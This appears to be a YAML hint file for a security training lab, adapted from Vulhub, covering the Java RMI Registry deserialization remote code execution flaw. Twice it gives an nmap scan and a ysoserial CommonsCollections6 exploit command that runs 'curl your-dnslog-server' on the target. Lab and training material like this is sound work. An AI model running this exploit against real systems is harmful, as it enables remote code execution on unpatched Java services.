@@ -1,0 +1,66 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: java/rmi-registry-bind-deserialization
+hint_levels:
+  low:
+  - Inspect the java service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 1099. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 1099 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): rmi: 1099/tcp → container 1099/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  high:
+  - 'Vulnerability: Java ≤JDK 8u111 RMI Registry Deserialization Remote Code Execution.'
+  - |-
+    Vulnerability Reproduction
+
+    Use the RMIRegistryExploit from ysoserial's exploit package to perform the attack:
+
+    ```bash
+    java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit {{NODE_IP}} 1099 CommonsCollections6 "curl your-dnslog-server"
+    ```
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/java/rmi-registry-bind-deserialization/1.png
+
+    The Registry will return an error, but this is normal and the command will still execute successfully.
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/java/rmi-registry-bind-deserialization/README.md'
+  - |-
+    Additional public references:
+    - https://www.rapid7.com/db/modules/exploit/multi/misc/java_rmi_server
+    - https://github.com/frohoff/ysoserial
+access_instructions:
+  title: Java ≤JDK 8u111 RMI Registry Deserialization Remote Code Execution
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 1099. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 1099 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): rmi: 1099/tcp → container 1099/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+  - title: Vulnerability Reproduction
+    instructions: |-
+      Use the RMIRegistryExploit from ysoserial's exploit package to perform the attack:
+
+      ```bash
+      java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit {{NODE_IP}} 1099 CommonsCollections6 "curl your-dnslog-server"
+      ```
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/java/rmi-registry-bind-deserialization/1.png
+
+      The Registry will return an error, but this is normal and the command will still execute successfully.
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/java/rmi-registry-bind-deserialization/README.md
+  readme_sha256: 7caf1a5fab66b73914775fd76d8bb906bb1fbe594d7e6bda8680c1f3fc541e7d
+  compose_sha256: 5b0bcbd061e478cdf90a24953551e35e21f60e0a6324bf6e001205d9e477f8fc
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
